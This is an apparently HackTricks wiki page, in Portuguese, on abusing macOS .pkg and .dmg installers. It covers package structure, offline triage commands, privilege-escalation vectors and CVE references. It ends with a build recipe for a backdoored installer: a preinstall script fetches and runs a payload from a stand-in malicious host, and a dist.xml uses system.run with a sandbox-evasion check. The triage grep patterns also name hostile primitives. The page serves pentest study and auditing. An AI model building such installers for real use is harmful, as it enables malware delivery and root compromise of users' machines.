# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Um **pacote instalador** do macOS (também conhecido como arquivo `.pkg`) é um formato de arquivo usado pelo macOS para **distribuir software**. Esses arquivos são como uma **caixa que contém tudo o que um software** precisa para instalar e executar corretamente.

O próprio arquivo de pacote é um archive que contém uma **hierarquia de arquivos e diretórios que serão instalados no computador alvo**. Ele também pode incluir **scripts** para executar tarefas antes e depois da instalação, como configurar arquivos de configuração ou limpar versões antigas do software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizações (título, texto de boas-vindas…) e checks de script/instalação
- **PackageInfo (xml)**: Info, requisitos de instalação, local de instalação, paths para scripts a executar
- **Bill of materials (bom)**: Lista de arquivos a instalar, atualizar ou remover com permissões de arquivo
- **Payload (CPIO archive gzip compressed)**: Arquivos a instalar no `install-location` do PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts de pré e pós-instalação e mais recursos extraídos para um diretório temporário para execução.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar o conteúdo do instalador sem descompactá-lo manualmente, você também pode usar a ferramenta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Se o objetivo é análise, tente **evitar abrir o pacote com `Installer.app` primeiro**. Alguns pacotes podem executar código assim que o Installer os abre (por exemplo via `system.run()` ou plug-ins do installer), então a extração offline geralmente é o ponto de partida mais seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informações Básicas sobre DMG

Arquivos DMG, ou Apple Disk Images, são um formato de arquivo usado pelo macOS da Apple para disk images. Um arquivo DMG é essencialmente uma **mountable disk image** (ele contém seu próprio filesystem) que contém raw block data, normalmente comprimidos e às vezes criptografados. Quando você abre um arquivo DMG, o macOS **o monta como se fosse um disco físico**, permitindo acessar seu conteúdo.

> [!CAUTION]
> Observe que instaladores **`.dmg`** suportam **tantos formatos** que, no passado, alguns deles contendo vulnerabilities foram abusados para obter **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

A hierarchy de um arquivo DMG pode ser diferente com base no conteúdo. No entanto, para application DMGs, ela normalmente segue esta estrutura:

- Top Level: este é a root da disk image. Ela frequentemente contém o application e possivelmente um link para a pasta Applications.
- Application (.app): este é o application real. No macOS, um application é normalmente um package que contém vários arquivos e pastas individuais que compõem o application.
- Applications Link: este é um shortcut para a pasta Applications no macOS. O objetivo disso é facilitar a instalação do application. Você pode arrastar o arquivo .app para este shortcut para instalar o app.

## Privesc via pkg abuse

### Execution from public directories

Se um script de pré ou pós-instalação estiver, por exemplo, executando a partir de **`/var/tmp/Installerutil`**, e um attacker puder controlar esse script, ele poderá escalar privileges sempre que ele for executado. Ou outro exemplo semelhante:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta é uma [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que vários installers e updaters chamam para **executar algo como root**. Essa function aceita o **path** do **file** a ser **executado** como parâmetro; no entanto, se um attacker conseguir **modificar** esse file, ele poderá **abusar** da sua execução com root para **escalar privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para mais informações, confira esta palestra: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Abuse de environment e shebang

Bugs modernos do PackageKit mostraram que scripts de instalação muitas vezes são executados como **trusted root code** enquanto ainda mantêm contexto controlado pelo atacante por perto. Ao auditar pacotes de vendors, preste atenção especial a:

- Shell interpreters como `#!/bin/zsh` / `#!/bin/bash`
- Chamadas como `sudo -u $USER`, `launchctl asuser`, ou qualquer lógica que confie em `$USER`, `$HOME`, `PATH`, `TMPDIR`, ou caminhos relativos
- Non-shell interpreters que podem carregar arquivos init ou libraries controlados pelo usuário
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para o bug de ambiente root do PackageKit de 2024 (`~/.zshenv` / `~/.bash*` inheritance durante instalações iniciadas pelo usuário), confira [a página genérica de privesc no macOS](../macos-privilege-escalation.md). Se o pacote for **Apple-signed**, o mesmo bug de script pode se tornar **relevante para SIP/TCC** porque `system_installd` pode carregar `com.apple.rootless.install.heritable`; veja [a página de SIP](../macos-security-protections/macos-sip.md).

### Execução ao montar

Se um instalador grava em `/tmp/fixedname/bla/bla`, é possível **criar um mount** sobre `/tmp/fixedname` com noowners para que você possa **modificar qualquer arquivo durante a instalação** e abusar do processo de instalação.

Um exemplo disso é **CVE-2021-26089**, que conseguiu **sobrescrever um script periódico** para obter execução como root. Para mais informações, veja a palestra: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

É possível simplesmente gerar um arquivo **`.pkg`** com **pre and post-install scripts** sem nenhum payload real além do malware dentro dos scripts.

### JS in Distribution xml

É possível adicionar tags **`<script>`** no arquivo **distribution xml** do pacote e esse código será executado e poderá **executar comandos** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Em pacotes distribution, isso geralmente depende do arquivo `Distribution` de nível superior habilitar scripts externos, por exemplo com `allow-external-scripts="true"`. Portanto, revisar apenas `preinstall` / `postinstall` não é suficiente: o próprio **Distribution XML** pode conter hooks `installation-check` / `volume-check` e caminhos diretos de execução `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Instalador backdoored

Instalador malicioso usando um script e código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referências

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
